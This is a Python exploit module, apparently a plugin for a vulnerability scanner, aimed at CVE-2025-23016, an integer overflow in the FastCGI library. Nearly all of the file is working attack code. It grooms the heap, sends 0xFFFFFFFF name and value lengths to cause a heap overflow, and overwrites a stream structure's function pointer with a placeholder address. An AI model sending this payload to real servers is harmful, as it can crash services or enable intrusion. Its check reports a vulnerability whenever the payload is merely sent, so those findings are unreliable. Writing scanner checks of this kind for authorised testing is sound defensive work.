"""FastCGI Integer Overflow Exploit - CVE-2025-23016"""

import datetime
import logging
import socket
import struct
import time

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

# Configure logging - Set default level to INFO
logging.basicConfig(
    level=logging.INFO,  # Default level for agent operation
    format="%(asctime)s - %(name)s - %(levelname)s - %(module)s:%(lineno)d - %(message)s",
    force=True,
)
logger = logging.getLogger(__name__)
# logger.setLevel(logging.DEBUG) # Uncomment for development/testing

VULNERABILITY_TITLE = (
    "FastCGI Integer Overflow Leading to Heap Overflow (CVE-2025-23016)"
)
VULNERABILITY_REFERENCE = "CVE-2025-23016"
VULNERABILITY_DESCRIPTION = """
An integer overflow vulnerability in the FastCGI library allows remote attackers
 to trigger a heap buffer overflow via crafted parameters.
This vulnerability occurs when processing parameter sizes in the ReadParams function,
where the calculation nameLen + valueLen + 2 can overflow on 32-bit systems,
leading to a small allocation. Subsequent writes (`FCGX_GetStr`) with the original large lengths
overwrite heap metadata or adjacent structures. This exploit attempts to trigger
this heap overflow condition. Confirmation may require server-side log analysis.
"""
RISK_RATING = "CRITICAL"
DEFAULT_TIMEOUT = datetime.timedelta(seconds=20)

# FastCGI constants
FCGI_VERSION = 1
FCGI_BEGIN_REQUEST = 1
FCGI_PARAMS = 4
FCGI_STDIN = 5
FCGI_STDOUT = 6
FCGI_STDERR = 7
FCGI_END_REQUEST = 3
FCGI_RESPONDER = 1
FCGI_RESERVED = 0


def _make_header(
    req_type: int, req_id: int, content_length: int, padding_length: int = 0
) -> bytes:
    """Create a FastCGI header."""
    return struct.pack(
        ">BBHHBB",
        FCGI_VERSION,
        req_type,
        req_id,
        content_length,
        padding_length,
        FCGI_RESERVED,
    )


def _make_begin_request_body(role: int, flags: int = 0) -> bytes:
    """Create a FastCGI begin request body."""
    return struct.pack(">HB5s", role, flags, b"\x00" * 5)


def encode_param(name: bytes, value: bytes) -> bytes:
    """Encode a FastCGI parameter (name-value pair)."""
    name_len = len(name)
    value_len = len(value)
    encoded_param = b""
    if name_len < 0x80:
        encoded_param += struct.pack("B", name_len)
    else:
        encoded_param += struct.pack(">I", name_len | 0x80000000)
    if value_len < 0x80:
        encoded_param += struct.pack("B", value_len)
    else:
        encoded_param += struct.pack(">I", value_len | 0x80000000)
    encoded_param += name
    encoded_param += value
    return encoded_param


@exploits_registry.register
class FastCGIIntegerOverflowExploit(webexploit.WebExploit):
    """Attempts to trigger CVE-2025-23016 heap overflow."""

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
        cve_ids=["CVE-2025-23016"],
    )

    def _trigger_heap_overflow(self, target: definitions.Target) -> bool:
        """Attempts trigger heap overflow. Returns True if payload sent."""
        host = target.host
        port = target.port
        req_id = 1  # Keep req_id simple for trigger attempt
        placeholder_addr = 0xDEADBEEF  # Dummy address
        dummy_command = " trigger_overflow; #"  # Simple string for payload structure

        # Optional Pre-crash attempt
        try:
            with socket.create_connection((host, port), timeout=5.0) as sock:
                begin_body = _make_begin_request_body(FCGI_RESPONDER)
                sock.sendall(
                    _make_header(FCGI_BEGIN_REQUEST, req_id, len(begin_body))
                    + begin_body
                )
                sock.sendall(_make_header(FCGI_PARAMS, req_id, 8) + b"\xff" * 8)
            logger.debug("_trigger_heap_overflow: Pre-crash sequence sent.")
            time.sleep(1.5)
        except (socket.timeout, socket.error, ConnectionRefusedError) as e:
            logger.debug(
                "_trigger_heap_overflow: Pre-crash network error [%s]: %s. Continuing...",
                type(e).__name__,
                e,
            )
            time.sleep(1.5)

        # Send the main exploit payload
        try:
            logger.debug("_trigger_heap_overflow: Connecting for exploit payload.")
            with socket.create_connection(
                (host, port), timeout=DEFAULT_TIMEOUT.seconds
            ) as sock:
                logger.debug("_trigger_heap_overflow: Connected.")
                params = b""
                # Grooming Params
                for i in range(9):
                    params += encode_param(("param%d" % i).encode(), b"B" * 0x26)
                for i in range(2):
                    params += encode_param(("small%d" % i).encode(), b"S" * 4)
                # Overflow Trigger Params
                params += struct.pack(">I", 0xFFFFFFFF)  # nameLen
                params += struct.pack(">I", 0xFFFFFFFF)  # valueLen
                # Content + Overflow Payload Structure (based on article analysis)
                params += b"A" * 16  # Fill 0x10 chunk
                exploit_data_part = dummy_command.encode()
                if exploit_data_part.startswith(b" ") is False:
                    exploit_data_part = b" " + exploit_data_part
                params += exploit_data_part.ljust(20, b"\x00")[
                    :20
                ]  # Overwrite stream bytes 0-19
                params += (
                    struct.pack("<I", 0) * 3
                )  # Overwrite stream bytes 20-31 (isClosed=0)
                params += struct.pack(
                    "<I", placeholder_addr
                )  # Overwrite stream bytes 32-35 (fillBuffProc)

                logger.debug("_trigger_heap_overflow: Sending BEGIN_REQUEST.")
                begin_body_exploit = _make_begin_request_body(FCGI_RESPONDER)
                sock.sendall(
                    _make_header(FCGI_BEGIN_REQUEST, req_id, len(begin_body_exploit))
                    + begin_body_exploit
                )

                logger.debug(
                    "_trigger_heap_overflow: Sending PARAMS (len=%d).", len(params)
                )
                sock.sendall(_make_header(FCGI_PARAMS, req_id, len(params)) + params)
                payload_sent_successfully = True  # Considered sent if this succeeds

                logger.debug("_trigger_heap_overflow: Sending terminators.")
                sock.sendall(_make_header(FCGI_PARAMS, req_id, 0))
                sock.sendall(_make_header(FCGI_STDIN, req_id, 0))
                logger.debug("_trigger_heap_overflow: Payload sequence sent.")

            logger.debug("_trigger_heap_overflow: Connection closed.")
            return payload_sent_successfully

        except (
            socket.timeout,
            socket.error,
            ConnectionRefusedError,
        ) as e:  # Catch specific network errors
            logger.error(
                "_trigger_heap_overflow: Network error during exploit send [%s]: %s",
                type(e).__name__,
                e,
            )
            return False  # Ensure return False if send fails

    def accept(self, target: definitions.Target) -> bool:
        """Checks if target host/port responds to a basic FastCGI probe."""
        logger.info(
            "Attempting to accept target %s:%d with REGULAR RECV probe",
            target.host,
            target.port,
        )
        req_id = 1
        try:
            with socket.create_connection(
                (target.host, target.port), timeout=DEFAULT_TIMEOUT.seconds
            ) as sock:
                logger.debug("Socket connected for accept()")
                begin_req_body = _make_begin_request_body(FCGI_RESPONDER)
                begin_req_header = _make_header(
                    FCGI_BEGIN_REQUEST, req_id, len(begin_req_body)
                )
                logger.debug("Sending FCGI_BEGIN_REQUEST header+body")
                sock.sendall(begin_req_header + begin_req_body)
                empty_params_header = _make_header(FCGI_PARAMS, req_id, 0)
                logger.debug("Sending empty FCGI_PARAMS header")
                sock.sendall(empty_params_header)
                empty_stdin_header = _make_header(FCGI_STDIN, req_id, 0)
                logger.debug("Sending empty FCGI_STDIN header")
                sock.sendall(empty_stdin_header)
                logger.debug(
                    "Full minimal request sequence sent. Attempting REGULAR RECV for FastCGI response..."
                )
                response_header_bytes = sock.recv(8)
                logger.debug(
                    "Received %d header bytes (regular recv)",
                    len(response_header_bytes),
                )

                if len(response_header_bytes) < 8:
                    logger.warning(
                        "Incomplete header received on REGULAR RECV (< 8 bytes)."
                    )
                    return False

                try:
                    _version, ftype, _resp_req_id, _content_len, _pad_len, _res = (
                        struct.unpack(">BBHHBB", response_header_bytes)
                    )
                except struct.error as e_unpack:
                    logger.error(
                        "Struct unpack error on received header bytes: %s", e_unpack
                    )
                    return False

                logger.debug(
                    "Unpacked response (REGULAR RECV probe): v=%d, type=%d, id=%d, len=%d, pad=%d",
                    _version,
                    ftype,
                    _resp_req_id,
                    _content_len,
                    _pad_len,
                )

                is_version_ok = _version == FCGI_VERSION
                is_req_id_ok = _resp_req_id == req_id
                is_type_ok = ftype in [
                    FCGI_STDOUT,
                    FCGI_STDERR,
                    FCGI_END_REQUEST,
                    FCGI_BEGIN_REQUEST,
                ]  # Allowed types

                if (
                    is_version_ok is True
                    and is_req_id_ok is True
                    and is_type_ok is True
                ):
                    logger.info(
                        "FastCGI service responded to REGULAR RECV probe at %s:%d with type %d",
                        target.host,
                        target.port,
                        ftype,
                    )
                    try:
                        sock.settimeout(5.0)  # Shorter timeout for consuming response
                        if _content_len > 0:
                            sock.recv(_content_len, socket.MSG_WAITALL)
                        if _pad_len > 0:
                            sock.recv(_pad_len, socket.MSG_WAITALL)
                    except (socket.timeout, socket.error) as e_consume:
                        logger.debug(
                            "Error/timeout consuming response body/padding in accept [%s]: %s. Accepting anyway.",
                            type(e_consume).__name__,
                            e_consume,
                        )
                    return True
                else:
                    logger.warning(
                        "Unexpected FastCGI response details (REGULAR RECV probe): type=%d, version=%d, req_id=%d",
                        ftype,
                        _version,
                        _resp_req_id,
                    )
                    return False

        except (
            socket.timeout,
            socket.error,
            ConnectionRefusedError,
            struct.error,
        ) as e:  # Consolidated exceptions
            logger.error(
                "Network/protocol error during accept probe for %s:%d [%s]: %s",
                target.host,
                target.port,
                type(e).__name__,
                e,
            )
        return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """Attempts to trigger the CVE-2025-23016 heap overflow."""
        vulnerabilities: list[definitions.Vulnerability] = []
        logger.info(
            "Attempting to trigger heap overflow for CVE-2025-23016 on %s:%d",
            target.host,
            target.port,
        )

        payload_sent = self._trigger_heap_overflow(target)

        if payload_sent is True:
            logger.info(
                "Successfully sent heap overflow trigger payload to %s:%d.",
                target.host,
                target.port,
            )
            # Report vulnerability without technical detail as RCE confirmation is unreliable.
            vulnerabilities.append(self.create_vulnerability(target))
        else:
            # Log error, do not report vulnerability if payload sending failed
            logger.error(
                "Failed to send heap overflow trigger payload to %s:%d.",
                target.host,
                target.port,
            )

        return vulnerabilities
